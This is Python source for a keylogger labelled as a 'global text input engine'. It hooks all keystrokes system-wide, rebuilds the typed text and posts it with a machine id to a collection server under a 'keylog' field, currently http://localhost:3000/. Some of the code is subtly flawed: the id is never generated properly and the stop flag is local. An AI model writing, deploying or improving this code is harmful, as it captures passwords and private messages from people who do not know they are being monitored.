import keyboard, time, requests, uuid

# ===============================================================
# GLOBAL TEXT INPUT ENGINE
# ===============================================================

url = "http://localhost:3000/"
userId = ""
try:
    with open("userId.txt", "r", encoding="utf-8") as f:
        userId = f.read()
except:
    userId = str(uuid.uuid4)
    with open("userId.txt", "w", encoding="utf-8") as f:
        f.write(userId)

isRunning = False
shift_pressed = False
caps_pressed = False

text_buffer = ""  # Store real typed text

# Mapping for keys where Shift changes the symbol
SHIFT_MAP = {
    "1": "!",
    "2": "@",
    "3": "#",
    "4": "$",
    "5": "%",
    "6": "^",
    "7": "&",
    "8": "*",
    "9": "(",
    "0": ")",
    "-": "_",
    "=": "+",
    "[": "{",
    "]": "}",
    ";": ":",
    "'": '"',
    ",": "<",
    ".": ">",
    "/": "?",
    "\\": "|",
    "`": "~",
}


def process_character(char):
    global shift_pressed, caps_pressed

    # Special handling for letters
    if char.isalpha():
        # XOR logic: shift ^ caps
        if shift_pressed ^ caps_pressed:
            return char.upper()
        else:
            return char.lower()

    # Special handling for symbols
    if shift_pressed and char in SHIFT_MAP:
        return SHIFT_MAP[char]

    return char  # default (numbers, normal chars, etc)


def on_key(event):
    global shift_pressed, caps_pressed, text_buffer
    global isRunning
    global url

    # Track shift key
    if event.name == "shift":
        shift_pressed = event.event_type == "down"
        return

    # Track caps lock toggling
    if event.name == "caps lock" and event.event_type == "down":
        caps_pressed = not caps_pressed
        return

    # Only process key press (not release)
    if event.event_type != "down":
        return

    # Handle Space
    if event.name == "space":
        text_buffer += " "
        print("TEXT:", text_buffer)

    # Handle Backspace
    if event.name == "backspace":
        if len(text_buffer) > 0:
            text_buffer = text_buffer[:-1]
        print("TEXT:", text_buffer)
        return

    # Handle Enter
    if event.name == "enter":

        data = {"userId": userId, "keylog": text_buffer}

        try:
            requests.post(url, json=data)
        finally:
            text_buffer = ""  # clear after enter
            return

    # Handle regular single-character keys
    if len(event.name) == 1:  # simple character like a, 1, !, etc.
        real_char = process_character(event.name)
        text_buffer += real_char
        print("TEXT:", text_buffer)
        return

    if event.name == "esc":
        if len(text_buffer) > 0:
            data = {"userId": userId, "keylog": text_buffer}
            try:
                requests.post(url, json=data)
            finally:
                isRunning = False
                keyboard.unhook_all()
                return
        isRunning = False
        keyboard.unhook_all()
        return


def main():
    # Start listening globally
    keyboard.hook(on_key)
    isRunning = True

    while isRunning:
        time.sleep(0.1)

    end = {"userId": userId, "type": "close"}
    try:
        requests.post(url, json=end)
    finally:
        print("Program end execution")


if __name__ == "__main__":
    main()
